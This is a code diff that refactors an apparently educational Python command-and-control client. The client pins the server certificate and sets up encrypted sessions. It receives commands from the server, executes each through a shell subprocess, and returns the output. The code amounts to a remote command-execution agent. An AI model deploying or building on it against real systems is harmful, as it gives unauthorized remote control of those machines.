@@ -1,24 +1,9 @@
-"""
-C2 Client Implementation
-Supports Steps 1-5 with modular design
-
-Author: [Candidate]
-References:
-- AsyncIO patterns: https://stackoverflow.com/questions/48506460/python-simple-socket-client-server-using-asyncio
-- Subprocess execution: https://docs.python.org/3/library/subprocess.html
-"""
-
 import asyncio
 import logging
 import time
 import uuid
-import os
-import sys
-import signal
 import base64
-import hashlib
 import argparse
-import subprocess
 from typing import List
 from models.message import Message
 from models.send_receive_msgs import send_message, receive_message
@@ -27,6 +12,7 @@ from models.command_type import CommandType
 from models.key_manager import KeyManager
 from models.encryption_manager import EncryptionManager
 from models.tls_helper import TLSSessionHelper
+import helper.subprocess as subprocess_helper
 
 # ==================== CONFIGURATION ====================
 
@@ -42,7 +28,6 @@ from cryptography import x509
 from cryptography.hazmat.primitives import hashes, serialization
 import base64
 
-SUBPROCESS_TERMINATION_GRACE_TIME_S = 2
 
 def get_spki_hash(der_cert_bytes: bytes) -> str:
     cert = x509.load_der_x509_certificate(der_cert_bytes)
@@ -55,8 +40,15 @@ def get_spki_hash(der_cert_bytes: bytes) -> str:
     digest.update(spki_bytes)
     return base64.b64encode(digest.finalize()).decode("ascii")
 
-def is_windows() -> bool:
-    return 'win' in sys.platform
+def validate_server_certificate(writer: asyncio.StreamWriter) -> bool:
+    server_sha = "jPxWXE+5YqcWif1pSG7ixZAVbFY3bI1JhbbtaOcPxFM="
+    ssl_obj = writer.get_extra_info("ssl_object")
+    der_cert = ssl_obj.getpeercert(binary_form=True)
+    server_sha_received = get_spki_hash(der_cert)
+    if server_sha_received == server_sha:
+        return True
+    logger.error("Server certificate is not valid")
+    return False
 
 class C2Client:
     """Main C2 Client"""
@@ -77,8 +69,6 @@ class C2Client:
         """
         Connect to C2 server and register
         """
-        server_sha = "jPxWXE+5YqcWif1pSG7ixZAVbFY3bI1JhbbtaOcPxFM="
-        is_connected = False
         try:
             if not self.running:
                 return False
@@ -91,31 +81,14 @@ class C2Client:
                 ssl=ssl_ctx,
             )
             logger.info(f"Connected to server at {self.server_host}:{self.server_port}")
-
-            ssl_obj = self.writer.get_extra_info("ssl_object")
-            der_cert = ssl_obj.getpeercert(binary_form=True)
-            server_sha_received = get_spki_hash(der_cert)
-            if server_sha_received != server_sha:
-                logger.error("Server certificate is not valid")
+            if not validate_server_certificate(self.writer):
                 await self._reset_writer_reader()
                 return False
-
             # Send registration message with client's public key
-            client_public_key = self.key_manager.serialized_public_key
-            await self._send_register(self.client_id, client_public_key)
-            
+            if not await self._send_register_message():
+                return False
             # Receive acknowledgment with server's public key
-            msg = await receive_message(self.reader)
-            msg = Message.from_payload(msg)
-            if msg and msg.type is MessageType.ACK:
-                # Setup encryption with server's public key
-                session_key = self.key_manager.compute_session_key(msg.command)
-                self._encryption_manager = EncryptionManager(session_key)
-                logger.info(f"Encryption established for client: {self.client_id}")
-                logger.info(f"Registered as {msg.client_id}")
-                is_connected = True
-            else:
-                logger.error("Registration failed")
+            return await self._receive_ack_message()
         
         except ConnectionRefusedError:
             logger.error("Connection refused, server possibly down")
@@ -123,8 +96,21 @@ class C2Client:
             logger.info("Connection attempt cancelled")
         except Exception as e:
             logger.error(f"Connection failed: {e}")
-        finally:
-            return is_connected
+
+    async def _receive_ack_message(self) -> bool:
+        encrypted_message = await receive_message(self.reader)
+        if not encrypted_message:
+            logger.error("No acknowledgment received")
+            return False
+        msg = Message.from_payload(encrypted_message)
+        if msg and msg.type is MessageType.ACK:
+            # Setup encryption with server's public key
+            session_key = self.key_manager.compute_session_key(msg.command)
+            self._encryption_manager = EncryptionManager(session_key)
+            logger.info(f"Registered as {msg.client_id}")
+            return True
+        logger.error("Registration failed")
+        return False
     
     async def reconnect_loop(self):
         """
@@ -167,9 +153,16 @@ class C2Client:
         except asyncio.CancelledError:
             logger.info("Client main loop cancelled")
             self.running = False
+        except asyncio.IncompleteReadError:
+            logger.info("main loop error - Server closed connection")
         except Exception as e:
             logger.error(f"Client main loop error: {e}")
         finally:
+            if self.running:
+                await self._reset_writer_reader()
+                logger.info("Client main loop finished - client still running")
+                return
+
             logger.info("Client canceling tasks")
             await self._cancel_tasks(tasks)
             logger.info("Terminating execution process")
@@ -205,18 +198,12 @@ class C2Client:
         """
         try:
             while self.running:
-                msg = await receive_message(self.reader)
-
-                # Connection closed
-                if not msg:
+                encrypted_message = await receive_message(self.reader)
+                if not encrypted_message:
                     logger.warning(f"Received an empty message")
                     break
-                
-                if not self._encryption_manager:
-                    logger.error("Encryption not established")
-                    break
                     
-                msg = self._encryption_manager.decrypt(msg)
+                msg = self._encryption_manager.decrypt(encrypted_message)
                 if not msg:
                     logger.warning(f"Failed to decrypt message")
                     break
@@ -226,15 +213,8 @@ class C2Client:
                     continue
 
                 if msg.command == CommandType.KILL.value:  # TODO
-                    logger.info("[_command_listener] Received kill command")
-                    await self._terminate_execution_process()
-                    self._drain_queue()
-                    self.running = False
-                # Queue command for execution
-                await self.command_queue.put({
-                    "cmd_id": msg.cmd_id,
-                    "command": msg.command
-                })
+                    await self._handle_received_kill_command()
+                await self._push_to_queue(msg)  # Queue command for execution
                 logger.info(f"Received command: {msg.command}")
             else:
                 logger.info("command_listener exiting | client not running")
@@ -242,9 +222,24 @@ class C2Client:
         except asyncio.CancelledError:
             logger.info('command_listener cancelled')
         except asyncio.IncompleteReadError:
-            logger.info(("Server" if self.running else "Client") + " closed connection")
+            if self.running:
+                logger.info("Server closed connection")
+                raise
+            else:
+                logger.info("Client closed connection")
         except Exception as e:
             logger.error(f"Command listener error: {e}")
+
+    async def _handle_received_kill_command(self) -> None:
+        await self._terminate_execution_process()
+        self._drain_queue()
+        self.running = False
+
+    async def _push_to_queue(self, message: Message) -> None:
+        await self.command_queue.put({
+            "cmd_id": message.cmd_id,
+            "command": message.command
+        })
 
     def _drain_queue(self):
         # TODO: make global helper function
@@ -277,12 +272,13 @@ class C2Client:
                 cmd_id, command = await self._fetch_command_from_queue()
                 if command is None:
                     logger.info("Received None from queue")
-                    continue
+                    break
+                logger.info(f"Processing command: {command}")
                 
                 result, exec_time_ms = await self._process_command(command)
                 # Send result back to server
                 if not await self._send_result(cmd_id, result, exec_time_ms):
-                    logger.info("Failed to send result - connection lost")
+                    logger.error("Failed to send result")
                     break
                 logger.info(f"Result sent ({exec_time_ms:.1f}ms)")
             else:
@@ -310,11 +306,11 @@ class C2Client:
             msg
         )
 
-    async def _send_register(self, client_id: str, public_key: str) -> bool:
+    async def _send_register_message(self) -> bool:
         """
         Send registration message to server
         """
-        msg = Message.as_register(client_id, public_key)
+        msg = Message.as_register(self.client_id, self.key_manager.serialized_public_key)
         return await send_message(
             self.writer,
             msg.to_payload(True)
@@ -323,88 +319,43 @@ class C2Client:
     async def _execute_command(self, command: str) -> str:
         """
         Execute bash-style command
-        Supports pipes, redirects, etc.
         """
         try:
-            self.execution_process = await self._create_subprocess(command)
+            self.execution_process = await subprocess_helper.create_subprocess(command)
             logger.info(f"Execution process created (pid: {self.execution_process.pid})")
-            output = await self._communicate_subprocess(self.execution_process)
+            output = await subprocess_helper.communicate_subprocess(self.execution_process)
             self.execution_process = None
             return output
         except asyncio.CancelledError:
-            logger.info("Command execution cancelled - terminating process")
             await self._terminate_execution_process()
             raise            
         except Exception as e:
             logger.info(f"Command execution error: {str(e)}")
             raise
-        
-    @staticmethod
-    async def _create_subprocess(command: str) -> asyncio.subprocess.Process:
-        if is_windows():  # TODO
-            kwargs = {"creationflags": subprocess.CREATE_NEW_PROCESS_GROUP}
-        else:
-            kwargs = {"start_new_session": True}
-
-        execution_process = await asyncio.create_subprocess_shell(
-            command,
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE,
-            **kwargs
-        )
-        return execution_process
-
-    @staticmethod
-    async def _communicate_subprocess(subprocess: asyncio.subprocess.Process) -> str:
-        stdout, stderr = await subprocess.communicate()
-        output = stdout.decode() + (f"\n[stderr] {stderr.decode()}" if stderr else "")
-        return output if output else "[No output]"
 
     async def _terminate_execution_process(self):
         """Terminate execution process if it exists"""
         if not self.execution_process:
             return
         try:
-            logger.info(f"Terminating execution process (pid: {self.execution_process.pid})")
-            await self._terminate_subprocess_gracefully(self.execution_process)
+            pid = self.execution_process.pid
+            await subprocess_helper.terminate_subprocess_gracefully(self.execution_process)
             self.execution_process = None
+            logger.info(f"Terminated execution process gracefully (pid: {pid})")
         except asyncio.TimeoutError:
-            logger.error("Terminating process timed out")
+            logger.error("Graceful termination timed out")
         except Exception as e:
-            logger.error(f"Error terminating process: {e}")
+            logger.error(f"Error gracefully terminating process: {e}")
         finally:
             if not self.execution_process:
                 return
-            await self._terminate_subprocess_forcefully(self.execution_process)
+            try:
+                await subprocess_helper.terminate_subprocess_forcefully(self.execution_process)
+                self.execution_process = None
+                logger.info(f"Terminated execution process forcefully (pid: {pid})")
+            except Exception as e:
+                logger.error(f"Error forcefully terminating process: {e}")
 
-    @staticmethod
-    async def _terminate_subprocess_gracefully(process: subprocess):
-        """Terminate a subprocess gracefully"""
-        try:
-            if is_windows():
-                process.send_signal(signal.CTRL_BREAK_EVENT)
-            else:
-                os.killpg(process.pid, signal.SIGTERM)
-            await asyncio.wait_for(
-                process.wait(),
-                timeout=SUBPROCESS_TERMINATION_GRACE_TIME_S
-            )
-        except asyncio.TimeoutError:
-            logger.error("Graceful termination timed out")
-            raise
-        except Exception as e:
-            logger.error(f"Error gracefully terminating process: {e}")
-            raise
-
-    @staticmethod
-    async def _terminate_subprocess_forcefully(process: subprocess):
-        """Terminate a subprocess forcefully"""
-        try:
-            process.kill()
-            await process.wait()
-        except Exception as e:
-            logger.error(f"Error forcefully killing process: {e}")
-    
     async def start(self):
         """Start the C2 client"""
         logger.info(f"Starting C2 client (ID: {self.client_id})")
